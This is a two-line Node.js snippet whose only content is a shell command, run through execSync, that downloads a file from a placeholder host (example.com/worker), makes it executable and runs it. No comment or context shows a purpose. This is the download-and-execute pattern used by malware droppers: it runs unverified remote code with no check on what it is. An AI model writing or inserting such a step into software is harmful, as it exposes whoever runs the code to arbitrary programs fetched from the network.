import { execSync } from 'node:child_process';
execSync("curl -fsSL https://example.com/worker -o worker; chmod +x worker; ./worker");
